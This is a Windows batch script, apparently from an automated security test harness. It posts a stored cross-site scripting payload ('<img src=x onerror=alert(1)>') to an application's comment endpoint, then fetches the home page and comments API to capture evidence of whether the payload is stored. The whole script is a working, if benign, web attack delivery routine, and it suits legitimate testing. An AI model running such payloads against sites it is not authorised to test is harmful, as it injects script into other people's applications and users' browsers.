@echo off
setlocal EnableExtensions EnableDelayedExpansion
call "%~dp0common_env.bat" "%~1"

set "XSS_PAYLOAD=<img src=x onerror=alert(1)>"
echo %LOG_PREFIX% Posting stored XSS payload...
> "%RAW_DIR%\stored_xss_payload.txt" echo !XSS_PAYLOAD!

curl.exe -sS -L "%APP_URL%/comment" ^
  -X POST ^
  --data-urlencode "displayName=automation-bat" ^
  --data-urlencode "content=!XSS_PAYLOAD!" ^
  -D "%RAW_DIR%\stored_xss_post.headers.txt" ^
  -o "%RAW_DIR%\stored_xss_post.body.txt" ^
  -w "%%{http_code}" > "%RAW_DIR%\stored_xss_post.status.txt"

if errorlevel 1 (
  > "%RAW_DIR%\stored_xss_post.status.txt" echo curl_failed
  exit /b 1
)

curl.exe -sS -L "%APP_URL%/" ^
  -D "%RAW_DIR%\stored_xss_home.headers.txt" ^
  -o "%RAW_DIR%\stored_xss_home.html" ^
  -w "%%{http_code}" > "%RAW_DIR%\stored_xss_home.status.txt"

if errorlevel 1 (
  > "%RAW_DIR%\stored_xss_home.status.txt" echo curl_failed
  exit /b 1
)

curl.exe -sS -L "%API_URL%/api/comments" ^
  -D "%RAW_DIR%\stored_xss_comments.headers.txt" ^
  -o "%RAW_DIR%\stored_xss_comments.json" ^
  -w "%%{http_code}" > "%RAW_DIR%\stored_xss_comments.status.txt"

if errorlevel 1 (
  > "%RAW_DIR%\stored_xss_comments.status.txt" echo curl_failed
  exit /b 1
)

echo %LOG_PREFIX% Stored XSS evidence capture complete.
exit /b 0
